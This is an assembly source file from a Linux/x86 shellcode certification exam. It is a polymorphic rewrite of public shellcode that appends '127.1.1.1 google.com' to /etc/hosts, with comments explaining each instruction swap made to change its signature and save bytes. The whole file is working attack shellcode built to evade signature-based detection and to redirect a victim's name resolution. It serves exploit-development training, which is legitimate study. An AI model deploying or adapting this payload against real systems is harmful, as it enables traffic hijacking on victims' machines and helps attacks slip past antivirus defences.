; Filename: poly_modify_hosts.nasm
; Author: Ray Doyle
; Website: https://www.doyler.net
;
; Purpose: SLAE Exam Assignment #6 - Polymorphic hosts file modification shellcode (Linux/x86) - 75 bytes (2 less than original)
; Original Shellcode: http://shell-storm.org/shellcode/files/shellcode-893.php

global _start

section .text

_start:
   ;xor ecx, ecx
   ;mul ecx

   ; Replaced XOR with SUB = net -2 byte
   sub ecx, ecx

   ; Moved up original null PUSH
   push ecx

open:
   ;mov al, 0x5
   
   ; Replaced MOV with PUSH-POP = net +1 byte
   push 0x5
   pop eax

   ;push 0x7374736f     ;/etc///hosts
   ;push 0x682f2f2f
   ;push 0x6374652f

   ; Replaced /etc///hosts with ///etc/hosts = net +0 bytes
   push 0x7374736f
   push 0x682f6374
   push 0x652f2f2f
   
   ; mov ebx, esp

   ; Replace MOV with PUSH-POP = net +0 bytes
   push esp
   pop ebx

   ; Push another null terminator for later = net +1 byte
   push ecx

   ;mov cx, 0x401

   ; Replaced mov cx with inc ecx + mov ch = net -1 byte
   inc ecx
   mov ch, 0x4

   ; Kept original interrupt - sys_open
   int 0x80

   ; Kept original exchange
   xchg eax, ebx

write:
   ; Kept original PUSH-POP. This could be replaced, but not without increasing length
   push 0x4
   pop eax
   
   ;jmp short _load_data
   ;_load_data:
      ;call _write
      ;google db "127.1.1.1 google.com"
   ;pop ecx

   ; Replacing JMP-CALL-POP with PUSH-MOV = net -1 byte
   push 0x6d6f632e
   push 0x656c676f
   push 0x6f672031
   push 0x2e312e31
   push 0x2e373231

   ;mov ecx, esp

   ; Replace my own MOV with PUSH-POP = net +0 bytes
   push esp
   pop ecx

   ;push 20         ;length of the string, dont forget to modify if changes the map

   ; While replacing the decimal with hex doesn't actually change the instruction, it tidies up the file = net +0 bytes
   push 0x14
   pop edx

   ; Kept original interrupt - sys_write
   int 0x80

close:
   ;push 0x6
   ;pop eax

   ; Replace PUSH-POP with XCHG-MOV = net +0 bytes
   xchg edx, eax
   mov al, 0x6

   ; Kept original interrupt - sys_close
   int 0x80

exit:
   ;push 0x1
   ;pop eax

   ; Replace PUSH-POP with XOR-INC = net +0 bytes
   xor eax, eax
   inc eax

   ; Kept original interrupt - sys_exit
   int 0x80